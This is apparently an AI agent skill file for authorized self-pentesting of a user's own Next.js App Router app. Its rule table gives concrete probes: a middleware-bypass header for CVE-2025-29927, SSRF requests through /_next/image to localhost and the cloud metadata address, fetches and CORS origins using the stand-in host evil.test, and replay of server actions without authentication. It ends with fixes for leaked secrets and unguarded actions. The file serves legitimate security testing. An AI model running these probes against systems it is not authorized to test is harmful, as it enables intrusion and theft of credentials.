---
name: nextjs-attack-probe
description: Authorized self-pentest probe targeting Next.js App Router-specific weaknesses. Tests NEXT_PUBLIC_* secret leakage in client bundles, server-action invocation without auth, ISR/cache poisoning via Vary mishandling, route-handler CORS misconfig, image proxy SSRF, and middleware matcher gaps. Use when the user asks to "pentest" their own Next.js app.
---

# Next.js Attack Probe

Authorized probe of a Next.js 13+ App Router app the user owns. Follow [shared probing conventions](../../../PROBING.md) — discover base URL from `package.json` `scripts.dev` (default `next dev` port `3000`), `next.config.{js,ts}` `serverRuntimeConfig`, `Dockerfile EXPOSE`, or env (`PORT`). Never hardcode.

## Next.js-specific attack surface

- **`NEXT_PUBLIC_*`** env vars are baked into the client JS bundle. Any secret with that prefix is leaked to anyone who fetches the site.
- **Server Actions** are reachable via crafted POSTs to any page, with `Next-Action: <hash>` header — no inherent auth.
- **`/_next/data/<buildId>/...json`** (Pages Router) and **route handlers** are often forgotten in middleware matchers.
- **`next/image`** proxy can be coerced into SSRF if `images.remotePatterns` is too permissive.
- **ISR `revalidatePath`/`revalidateTag`** with user-influenced paths → cache poisoning.
- **`x-middleware-subrequest`** header bypass (CVE-2025-29927 class) — Next.js < 15.1 patches.

## Procedure

1. Authorization preflight + base URL discovery.
2. Pull build manifest: `GET /_next/static/chunks/*.js` (sample 1-2 main bundles); grep for `NEXT_PUBLIC_` and obvious secret shapes.
3. Probe per rule table.

## Rules

| ID | Severity | Probe | Confirmed when |
|----|----------|-------|----------------|
| NEXT-ENV-001 | critical | `GET /_next/static/chunks/main-*.js` and `app/page-*.js`; grep for `sk-live`, `xoxb-`, `AKIA`, JWT-shaped strings, `_KEY=`, `_SECRET=` | A token-shaped string is present in shipped JS = `NEXT_PUBLIC_*` leak |
| NEXT-MW-001 | critical | Identify a sensitive route guarded by middleware (`/dashboard`); send `GET /dashboard` with header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` | 2xx = CVE-2025-29927 class bypass; require Next.js patch |
| NEXT-MW-002 | high | Try `/dashboard%20`, `/dashboard/`, `/dashboard?_rsc=1`, `/_next/data/<buildId>/dashboard.json` | 2xx returns protected data = matcher excludes a variant |
| NEXT-SA-001 | high | Capture a `Next-Action: <hash>` header from a logged-in user; replay the POST without cookies | 2xx + state change = server action runs without auth |
| NEXT-SA-002 | high | Replay an admin server action with a non-admin user's session | 2xx state change = missing role check inside the action |
| NEXT-IMG-001 | high | `GET /_next/image?url=http://127.0.0.1:1&w=128&q=75` and `?url=http://169.254.169.254/latest/meta-data/` | Connection succeeds / metadata returned = `images.remotePatterns` too permissive |
| NEXT-IMG-002 | medium | `GET /_next/image?url=https://evil.test/x.svg&w=128&q=75` with attacker host | 200 fetched arbitrary remote = host allowlist missing |
| NEXT-CACHE-001 | medium | If revalidate webhook exists (`POST /api/revalidate?path=...`), send `path=/admin` | 200 + admin page now serves stale/poisoned content |
| NEXT-RH-001 | high | `OPTIONS /api/*` with `Origin: https://evil.test` + credentials | `ACAO` reflects + `ACAC: true` |
| NEXT-RH-002 | high | For each `/api/*` mutating route handler, unauthenticated POST | 2xx = no auth in handler |
| NEXT-DBG-001 | low | `GET /__nextjs_original-stack-frame?...`, `/_next/static/development/_devPagesManifest.json` | 200 = dev mode reachable in this environment |
| NEXT-VER-001 | low | Inspect `__next_data__` script tag for `buildId`; check headers for `x-powered-by: Next.js`; if version detectable, cross-ref recent CVEs | Version matches a known affected range |

## Special handling

- **NEXT-ENV-001** is the most common high-impact finding. When confirmed, list each leaked variable name (not value, unless explicitly requested) and the file path inside the bundle.
- **NEXT-MW-001** must be reported even if the patch is applied — the user may run multiple Next versions in monorepo.

## Wrong vs. right

### NEXT-ENV-001 (env leak)

```ts
// ❌ This ships to every browser
// .env
NEXT_PUBLIC_OPENAI_API_KEY=sk-live-...

// any component
const key = process.env.NEXT_PUBLIC_OPENAI_API_KEY;
```

```ts
// ✅ Server-only env, called from a route handler
// .env
OPENAI_API_KEY=sk-live-...

// app/api/chat/route.ts
export async function POST(req: Request) {
  const key = process.env.OPENAI_API_KEY;  // never sent to client
  // ...
}
```

### NEXT-SA-001 (unauth server action)

```ts
// ❌
"use server";
export async function deleteAccount(id: string) {
  await db.user.delete({ where: { id } });
}
```

```ts
// ✅
"use server";
import { auth } from "@/auth";
import { z } from "zod";

const Schema = z.object({ id: z.string().uuid() });

export async function deleteAccount(input: unknown) {
  const session = await auth();
  if (!session?.user) throw new Error("Unauthorized");
  const { id } = Schema.parse(input);
  if (session.user.id !== id && session.user.role !== "admin") {
    throw new Error("Forbidden");
  }
  await db.user.delete({ where: { id } });
}
```

## References

- Next.js Server Actions: https://nextjs.org/docs/app/api-reference/functions/server-actions
- Next.js Middleware: https://nextjs.org/docs/app/building-your-application/routing/middleware
- CVE-2025-29927: https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
- Next.js Image Optimization: https://nextjs.org/docs/app/api-reference/components/image#remotepatterns
